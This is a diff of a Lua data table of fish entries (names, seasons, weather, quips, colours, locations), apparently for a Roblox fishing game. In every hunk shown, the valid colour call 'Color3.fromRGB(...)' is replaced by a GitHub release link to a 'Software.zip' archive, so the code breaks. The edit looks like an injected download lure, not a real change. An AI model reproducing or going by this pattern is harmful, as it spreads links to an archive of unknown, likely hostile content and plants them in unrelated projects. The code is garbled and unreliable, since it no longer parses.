 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Snowcap";
 		};
@@ -747,7 +747,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Autumn"};
 			Weather = {"Windy"};
 			Quips = {"A Redeyed Bass!", "I caught a Redeye Bass!", "Woah! A Redeye Bass!", "Ouu! A Redeye Bass!"};
-			SparkleColor = Color3.fromRGB(255, 29, 29);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 29, 29);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Terrapin";
 		};
@@ -765,7 +765,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"I caught a Tuna!", "A Skipjack Tuna!", "Woah, a Skipjack Tuna!", "I caught a Skipjack Tuna!"};
-			SparkleColor = Color3.fromRGB(162, 174, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(162, 174, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Snowcap";
 		};
@@ -783,7 +783,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Winter"};
 			Weather = {"Foggy"};
 			Quips = {"A Bream!", "Bream!", "I caught a Bream!", "Woah, a Bream!", "Hello, Bream!"};
-			SparkleColor = Color3.fromRGB(255, 255, 193);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 193);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Moosewood";
 		};
@@ -801,7 +801,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"Clear"};
 			Quips = {"A Pumpkinseed!", "I caught a Pumpkinseed!", "Can it hear me?", "Woah.. Cool ears!"};
-			SparkleColor = Color3.fromRGB(255, 60, 60);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 60, 60);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Roslit";
 		};
@@ -820,7 +820,7 @@ do -- INFO FISH
 			Seasons = {"Autumn", "Winter"};
 			Weather = {"Rain"};
 			Quips = {"Salmoff!", "Woah!", "Awesome!", "A Sockeye Salmon!", "Woah, A Sockeye Salmon!", "A Salmon!"};
-			SparkleColor = Color3.fromRGB(255, 160, 160);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 160, 160);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Moosewood";
 		};
@@ -838,7 +838,7 @@ do -- INFO FISH
 			Seasons = {"Autumn"};
 			Weather = {"Clear"};
 			Quips = {"A Sweetfish!", "Is there a sour one?", "Woah! A Sweetfish!", "Hope it's not artificially sweet!"};
-			SparkleColor = Color3.fromRGB(157, 255, 96);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(157, 255, 96);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Sunstone";
 		};
@@ -856,7 +856,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Clear"};
 			Quips = {"I thought theres a rainbow?", "Woah, a Trout!", "Woah!", "A Trout!", "I caught a Trout!"};
-			SparkleColor = Color3.fromRGB(99, 168, 94);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(99, 168, 94);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Moosewood";
 		};
@@ -874,7 +874,7 @@ do -- INFO FISH
 			Seasons = {"Summer", "Spring"};
 			Weather = {"Clear", "Foggy"};
 			Quips = {"A Corgi.. I mean Porgy??", "Woah, a Porgy!", "Nice, A Porgy!", "A Porgy!", "I caught a Porgy!"};
-			SparkleColor = Color3.fromRGB(248, 255, 169);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(248, 255, 169);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -892,7 +892,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Autumn"};
 			Weather = {"None"};
 			Quips = {"Woah! A Walleye!", "I caught a Walleye!", "Lovely, a Walleye!"};
-			SparkleColor = Color3.fromRGB(113, 188, 96);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(113, 188, 96);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Terrapin";
 		};
@@ -910,7 +910,7 @@ do -- INFO FISH
 			Seasons = {"Summer", "Spring"};
 			Weather = {"Clear"};
 			Quips = {"A Bluegill!", "But I pinked the Red Pill!", "I caught a Bluegill!!", "Lovely, a Bluegill!"};
-			SparkleColor = Color3.fromRGB(149, 255, 188);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(149, 255, 188);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Snowcap";
 		};
@@ -928,7 +928,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"Clear"};
 			Quips = {"I caught a Sardine!", "Ouu! A Sardine!", "A Sardine!"};
-			SparkleColor = Color3.fromRGB(185, 185, 185);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(185, 185, 185);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -946,7 +946,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Autumn"};
 			Weather = {"None"};
 			Quips = {"A Char!", "I caught an Arctic Char!", "Woah, a Char!", "It's an Arctic Char!"};
-			SparkleColor = Color3.fromRGB(255, 83, 83);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 83, 83);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Snowcap";
 		};
@@ -964,7 +964,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Autumn"};
 			Weather = {"None"};
 			Quips = {"A Red Drum!", "I caught a Red Drum!", "Woah, a Drum!", "It'a Red Drum!", "All I see is Red Drum."};
-			SparkleColor = Color3.fromRGB(255, 49, 49);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 49, 49);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Snowcap";
 		};
@@ -982,7 +982,7 @@ do -- INFO FISH
 			Seasons = {"Summer", "Spring"};
 			Weather = {"Clear", "Windy"};
 			Quips = {"A Herring!", "I caught a Herring!", "Oh, a Herring!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Snowcap";
 		};
@@ -1000,7 +1000,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"Foggy", "Rain"};
 			Quips = {"A Pollock!", "I caught a Pollock!", "Woah, a Pollock!", "Look! A Pollock!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Snowcap";
 		};
@@ -1018,7 +1018,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"None"};
 			Quips = {"I caught a Spiderfish!", "Ouu! A Spiderfish!", "A Spiderfish!"};
-			SparkleColor = Color3.fromRGB(53, 60, 79);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(53, 60, 79);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Vertigo";
 		};
@@ -1036,7 +1036,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"Rain"};
 			Quips = {"A Mudfish!", "Ouu, A Mudfish!", "I caught a Mudfish!"};
-			SparkleColor = Color3.fromRGB(189, 125, 95);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(189, 125, 95);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Mushgrove";
 		};
@@ -1054,7 +1054,7 @@ do -- INFO FISH
 			Seasons = {"Spring"};
 			Weather = {"Clear", "Foggy"};
 			Quips = {"I caught a Snook!", "It's a Snook!", "A Snook!", "Look at this Snook!"};
-			SparkleColor = Color3.fromRGB(255, 233, 125);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 233, 125);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Moosewood";
 		};
@@ -1072,7 +1072,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Is it magic?", "Woah, a Carp!", "It's a Carp!", "Woahh! This is bigger than I thought.", "Carp-tastic!", "!!!", "Woah!", "A Carp! My skill are sharp!"};
-			SparkleColor = Color3.fromRGB(255, 186, 125);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 186, 125);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Moosewood";
 		};
@@ -1090,7 +1090,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Autumn"};
 			Quips = {"Is it grey magic?", "Woah, a Grey Carp!", "It's a Carp!", "Woahh! A Grey Carp!!", "Carp-tastic!", "!!!", "Woah! Grey Carp!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Mushgrove";
 		};
@@ -1108,7 +1108,7 @@ do -- INFO FISH
 			Seasons = {"Summer", "Autumn"};
 			Weather = {"None"};
 			Quips = {"A Red Snapper!", "Woah! I caught a Red Snapper!", "I caught a Red Snapper!", "Red Snapper!!!"};
-			SparkleColor = Color3.fromRGB(255, 74, 74);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 74, 74);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Moosewood";
 		};
@@ -1126,7 +1126,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Autumn"};
 			Weather = {"Foggy"};
 			Quips = {"A Mackerel!", "I caught a Mackerel!", "Woah, a Mackerel!", "Mackerelllll!", "What's up, Mackerel!"};
-			SparkleColor = Color3.fromRGB(207, 207, 207);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(207, 207, 207);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Ocean";
 		};
@@ -1144,7 +1144,7 @@ do -- INFO FISH
 			Seasons = {"Autumn", "Winter"};
 			Weather = {"None"};
 			Quips = {"I caught a Haddock!", "Woah, a Haddock!!"};
-			SparkleColor = Color3.fromRGB(227, 227, 227);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(227, 227, 227);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Ocean";
 		};
@@ -1162,7 +1162,7 @@ do -- INFO FISH
 			Seasons = {"Winter", "Spring"};
 			Weather = {"Foggy"};
 			Quips = {"A Cod!", "I caught a Cod!", "Woah, a Cod!", "Cod of duty!", "What's up, Coddy!"};
-			SparkleColor = Color3.fromRGB(207, 158, 139);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(207, 158, 139);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Ocean";
 		};
@@ -1180,7 +1180,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"Foggy"};
 			Quips = {"A Longtail Bass!", "I caught a Longtail Bass!"};
-			SparkleColor = Color3.fromRGB(255, 89, 89);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 89, 89);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Sunstone";
 		};
@@ -1198,7 +1198,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Winter"};
 			Weather = {"Rain", "Clear"};
 			Quips = {"Salmoff!", "Woah!", "Awesome!", "A Salmon!", "Woah, A Salmon!", "A Salmon!!!"};
-			SparkleColor = Color3.fromRGB(65, 166, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(65, 166, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Ocean";
 		};
@@ -1216,7 +1216,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Rain", "Fog"};
 			Quips = {"An Arapaima!", "I caught an Arapaima!", "Woah, an Arapaima!"};
-			SparkleColor = Color3.fromRGB(154, 39, 39);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(154, 39, 39);
 			HoldAnimation = fish:WaitForChild("heavy");
 			From = "Roslit";
 		};
@@ -1234,7 +1234,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"None"};
 			Quips = {"Woah, a Twilight Eel!", "I caught an Eel!", "It looks like a tadpole!"};
-			SparkleColor = Color3.fromRGB(128, 255, 121);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(128, 255, 121);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Vertigo";
 		};
@@ -1252,7 +1252,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"None"};
 			Quips = {"A Bluefin Tuna!", "I caught a Bluefin Tuna!", "Woah, a Bluefin Tuna!", "Tunaaaaa!", "What's up, Tuna!"};
-			SparkleColor = Color3.fromRGB(125, 210, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(125, 210, 255);
 			HoldAnimation = fish:WaitForChild("heavy");
 			From = "Ocean";
 		};
@@ -1270,7 +1270,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"None"};
 			Quips = {"A Yellowfin Tuna!", "I caught a Yellowfin Tuna!", "Woah, a Yellowfin Tuna!", "Tunaaaaa!", "What's up, Tuna!"};
-			SparkleColor = Color3.fromRGB(255, 235, 135);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 235, 135);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Moosewood";
 		};
@@ -1288,7 +1288,7 @@ do -- INFO FISH
 			Seasons = {"Spring"};
 			Weather = {"Clear", "Rain"};
 			Quips = {"An Amberjack!", "I caught an Amberjack!", "Woah, an Amberjack!", "Lumberjack- I mean Amberjack!"};
-			SparkleColor = Color3.fromRGB(219, 219, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(219, 219, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Ocean";
 		};
@@ -1306,7 +1306,7 @@ do -- INFO FISH
 			Seasons = {"Spring"};
 			Weather = {"Clear", "Rain"};
 			Quips = {"An Amberjack!", "I caught an Amberjack!", "Woah, an Amberjack!", "Lumberjack- I mean Amberjack!"};
-			SparkleColor = Color3.fromRGB(219, 219, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(219, 219, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Keepers Altar";
 		};
@@ -1325,7 +1325,7 @@ do -- INFO FISH
 			Seasons = {"Autumn", "Summer"};
 			Weather = {"Windy"};
 			Quips = {"I caught a Lingcod!", "Woah! this is freaky!", "A Lingcod!", "It's a Lingcod!"};
-			SparkleColor = Color3.fromRGB(76, 115, 55);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(76, 115, 55);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Snowcap";
 		};
@@ -1343,7 +1343,7 @@ do -- INFO FISH
 			Seasons = {"Spring, Summer"};
 			Weather = {"None"};
 			Quips = {"I can barely see it!", "A Gudgeon.!", "Oh, cool!"};
-			SparkleColor = Color3.fromRGB(216, 251, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(216, 251, 255);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Terrapin";
 		};
@@ -1361,7 +1361,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Clear"};
 			Quips = {"A Perch!", "I caught a Perch!", "Woah, a Perch!", "Aww! A Perch!"};
-			SparkleColor = Color3.fromRGB(119, 163, 77);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(119, 163, 77);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Roslit";
 		};
@@ -1379,7 +1379,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Autumn"};
 			Weather = {"None"};
 			Quips = {"A White Perch!", "I caught a White Perch!", "Woah, a Perch!", "Aww! A Perch!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Mushgrove";
 		};
@@ -1397,7 +1397,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"Clear"};
 			Quips = {"Doesn't look very gold..", "Woah, a Goldfish!", "A goldfish!", "I caught a Goldfish!", "Aw! I caught a Goldfish!"};
-			SparkleColor = Color3.fromRGB(255, 184, 69);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 184, 69);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Moosewood";
 		};
@@ -1415,7 +1415,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"Clear"};
 			Quips = {"Woah, a Bluefish!", "A Bluefish!", "I caught a Bluefish!", "Aw! I caught a Bluefish!"};
-			SparkleColor = Color3.fromRGB(60, 63, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(60, 63, 255);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Keepers Altar";
 		};
@@ -1433,7 +1433,7 @@ do -- INFO FISH
 			Seasons = {"Spring"};
 			Weather = {"Clear"};
 			Quips = {"Ouu a Minnow!", "Woah, a Minnow!", "A Minnow!", "I caught a Minnow!", "Aw! I caught a Baitfish!"};
-			SparkleColor = Color3.fromRGB(161, 161, 161);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(161, 161, 161);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Roslit";
 		};
@@ -1451,7 +1451,7 @@ do -- INFO FISH
 			Seasons = {"Summer", "Spring"};
 			Weather = {"Rain"};
 			Quips = {"A Halibut!", "A Flatfish!", "I Caught a Halibut!", "Ou! A Halibut!"};
-			SparkleColor = Color3.fromRGB(207, 129, 93);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(207, 129, 93);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Ocean";
 		};
@@ -1469,7 +1469,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"Foggy"};
 			Quips = {"Ouu a Clownfish!", "Woah, a Clownfish!", "A Clownfish!", "I caught a Clownfish!", "I caught a Clownfish!", "What kind of circus is this?"};
-			SparkleColor = Color3.fromRGB(255, 167, 43);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 167, 43);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Roslit";
 		};
@@ -1487,7 +1487,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"None"};
 			Quips = {"Ouu a Blue Tang!", "Woah, a Blue Tang!", "A Blue Tang!", "I caught a Blue Tang!", "I caught a Blue Tang!", "Found her!"};
-			SparkleColor = Color3.fromRGB(48, 69, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(48, 69, 255);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Roslit";
 		};
@@ -1505,7 +1505,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"None"};
 			Quips = {"Ouu a Blue Tang!", "Woah, a Blue Tang!", "A Blue Tang!", "I caught a Blue Tang!", "I caught a Blue Tang!", "Found her!"};
-			SparkleColor = Color3.fromRGB(255, 158, 73);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 158, 73);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Roslit Volcano";
 		};
@@ -1523,7 +1523,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"None"};
 			Quips = {"Ouu a Red Tang!", "Woah, a Red Tang!", "A Red Tang!", "I caught a Red Tang!", "I caught a Red Tang!", "Found her!.. But red!"};
-			SparkleColor = Color3.fromRGB(255, 82, 82);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 82, 82);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Sunstone";
 		};
@@ -1541,7 +1541,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"None"};
 			Quips = {"Ouu a Pale Tang!", "Woah, a Pale Tang!", "A Pale Tang!", "I caught a Pale Tang!", "I caught a Pale Tang!", "Found her!.. But albino!"};
-			SparkleColor = Color3.fromRGB(255, 187, 187);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 187, 187);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Keepers Altar";
 		};
@@ -1559,7 +1559,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Clear"};
 			Quips = {"Ouu a Glassfish!", "Woah, a Glassfish!", "I can barely see it!"};
-			SparkleColor = Color3.fromRGB(126, 126, 126);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(126, 126, 126);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Sunstone";
 		};
@@ -1577,7 +1577,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Clear"};
 			Quips = {"Ouu an Angelfish!", "Woah, an Angelfish!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Roslit";
 		};
@@ -1595,7 +1595,7 @@ do -- INFO FISH
 			Seasons = {"Summer", "Autumn"};
 			Weather = {"None"};
 			Quips = {"A Nurse Shark!", "Woah! A Nurse Shark!", "I Caught a Nurse Shark!"};
-			SparkleColor = Color3.fromRGB(255, 152, 152);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 152, 152);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Ocean";
 		};
@@ -1613,7 +1613,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Clear", "Foggy"};
 			Quips = {"Ouu a Glassfish!", "Woah, a Glassfish!", "I can barely see it!"};
-			SparkleColor = Color3.fromRGB(255, 249, 80);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 249, 80);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Roslit";
 		};
@@ -1631,7 +1631,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Windy"};
 			Quips = {"A Flounder!", "A Flatfish!", "I caught a Flounder!"};
-			SparkleColor = Color3.fromRGB(86, 68, 57);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(86, 68, 57);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Moosewood";
 		};
@@ -1649,7 +1649,7 @@ do -- INFO FISH
 			Seasons = {"Summer", "Spring"};
 			Weather = {"Clear"};
 			Quips = {"I caught a Stingray!", "Woah.. a Stingray!"};
-			SparkleColor = Color3.fromRGB(180, 87, 50);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(180, 87, 50);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -1667,7 +1667,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Woah, a Barracuda!", "I caught a Barracuda!", "A Barracuda!!", "!!!!"};
-			SparkleColor = Color3.fromRGB(117, 141, 121);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(117, 141, 121);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Ocean";
 		};
@@ -1685,7 +1685,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"None"};
 			Quips = {"Woah, a n Abyssacuda!", "I caught an Abyssacuda!", "An Abyssacuda!!", "Abyssacudaaaaa!!"};
-			SparkleColor = Color3.fromRGB(87, 77, 116);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(87, 77, 116);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Vertigo";
 		};
@@ -1703,7 +1703,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"None"};
 			Quips = {"I caught a Gar!", "It's an Alligator Gar!", "A Gar!!", "Woah, an Alligator Gar!", "Aye!! A Gar!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Roslit";
 		};
@@ -1721,7 +1721,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"Foggy"};
 			Quips = {"A Gar!", "I caught a Marsh Gar!", "Woah! A Marsh Gar!"};
-			SparkleColor = Color3.fromRGB(180, 36, 36);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(180, 36, 36);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Mushgrove";
 		};
@@ -1739,7 +1739,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Foggy"};
 			Quips = {"A Gar!", "I caught a Fangborn Gar!", "Woah! A Fangborn Gar!"};
-			SparkleColor = Color3.fromRGB(32, 26, 48);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(32, 26, 48);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Vertigo";
 		};
@@ -1757,7 +1757,7 @@ do -- INFO FISH
 			Seasons = {"Autumn", "Summer"};
 			Weather = {"None"};
 			Quips = {"Woah, a Trumpetfish!", "Baby Keem!", "What a catch!", "Holy.. This thing is weird.."};
-			SparkleColor = Color3.fromRGB(247, 255, 98);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(247, 255, 98);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Sunstone";
 		};
@@ -1775,7 +1775,7 @@ do -- INFO FISH
 			Seasons = {"Spring"};
 			Weather = {"Clear", "Windy"};
 			Quips = {"I caught a Mahi Mahi!", "Woah, a Mahi Mahi!!", "It's a Mahi Mahi!"};
-			SparkleColor = Color3.fromRGB(255, 249, 89);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 249, 89);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Sunstone";
 		};
@@ -1793,7 +1793,7 @@ do -- INFO FISH
 			Seasons = {"Spring"};
 			Weather = {"Clear", "Windy"};
 			Quips = {"I caught a Voidfin Mahi!", "Woah, a Voidfin Mahi!!", "It's a Voidfin Mahi!"};
-			SparkleColor = Color3.fromRGB(83, 67, 106);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(83, 67, 106);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Vertigo";
 		};
@@ -1811,7 +1811,7 @@ do -- INFO FISH
 			Seasons = {"Autumn", "Winter"};
 			Weather = {"Rain"};
 			Quips = {"Woah, a Chinfish!", "The Megachin!", "I caught a Chinfish!", "It's a Chinfish!"};
-			SparkleColor = Color3.fromRGB(214, 214, 214);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(214, 214, 214);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Sunstone";
 		};
@@ -1829,7 +1829,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"Windy"};
 			Quips = {"A Napoleonfish!", "I caught a Napoleonfish!", "Woahh, a Napoleonfish!"};
-			SparkleColor = Color3.fromRGB(90, 255, 195);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(90, 255, 195);
 			HoldAnimation = fish:WaitForChild("basic");
